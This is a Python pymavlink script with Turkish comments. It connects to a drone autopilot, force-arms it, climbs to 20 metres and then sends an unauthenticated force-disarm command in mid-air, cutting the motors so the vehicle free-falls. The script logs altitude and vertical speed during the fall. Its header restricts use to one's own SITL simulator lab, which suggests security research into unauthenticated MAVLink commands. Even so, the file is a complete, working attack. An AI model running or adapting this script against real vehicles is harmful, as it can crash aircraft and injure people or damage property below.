#!/usr/bin/env python3
# disarm_in_flight.py
# Araci 20m'ye kaldirir, sonra ayni kimlik dogrulamasiz kanaldan
# force-disarm gonderip havada motorlari keser (arac serbest duser).
# Kullanim: python3 disarm_in_flight.py tcp:127.0.0.1:5762
# Yalnizca kendi SITL laboratuvarinda calistir.

import sys
import time
from pymavlink import mavutil

CONN = sys.argv[1] if len(sys.argv) > 1 else "tcp:127.0.0.1:5762"
m = mavutil.mavlink_connection(CONN)
m.wait_heartbeat(timeout=30)
if m.target_component == 0:
    m.target_component = 1
m.mav.request_data_stream_send(m.target_system, m.target_component,
                               mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)

# Once 3D GPS kilidi bekle (arm icin gerekli)
print("[*] GPS bekleniyor")
t = time.time() + 50
while time.time() < t:
    g = m.recv_match(type="GPS_RAW_INT", blocking=True, timeout=2)
    if g and g.fix_type >= 3:
        p = m.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=2)
        if p and p.lat != 0:
            break

# GUIDED + force-arm (param2=21196) + 20m kalkis
m.set_mode("GUIDED")
time.sleep(2)
print("[*] arm + takeoff 20m")
armed = False
t = time.time() + 50
while time.time() < t and not armed:
    m.mav.command_long_send(m.target_system, m.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 21196, 0, 0, 0, 0, 0)
    t2 = time.time() + 4
    while time.time() < t2:
        hb = m.recv_match(type="HEARTBEAT", blocking=True, timeout=2)
        if hb and (hb.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            armed = True
            break
if not armed:
    print("[!] arm olmadi")
    sys.exit(1)

m.mav.command_long_send(m.target_system, m.target_component,
    mavutil.mavlink.MAV_CMD_NAV_TAKEOFF, 0, 0, 0, 0, 0, 0, 0, 20)
# 20m'ye varana kadar bekle
t = time.time() + 45
while time.time() < t:
    v = m.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=2)
    if v and v.relative_alt / 1000.0 >= 19.5:
        break
print("[+] 20m'de, asili. Simdi force-disarm.")

# Asil olay: havada force-disarm. param1=0 (disarm), param2=21196 (force).
# Imza/parola sorulmadan kabul edilir, motorlar kesilir.
m.mav.command_long_send(m.target_system, m.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 0, 21196, 0, 0, 0, 0, 0)
print("    [>] DISARM gonderildi")

# Dususu yukseklik dustukce izleyelim
print("    dususu izliyoruz:")
t = time.time() + 12
low = 0
while time.time() < t:
    v = m.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=2)
    if not v:
        continue
    a = v.relative_alt / 1000.0
    print("    yukseklik=%5.1fm  dikey_hiz=%+.1fm/s" % (a, -v.vz / 100.0))
    if a <= 0.5:
        low += 1
        if low >= 2:
            break
print("[*] Arac yerde.")
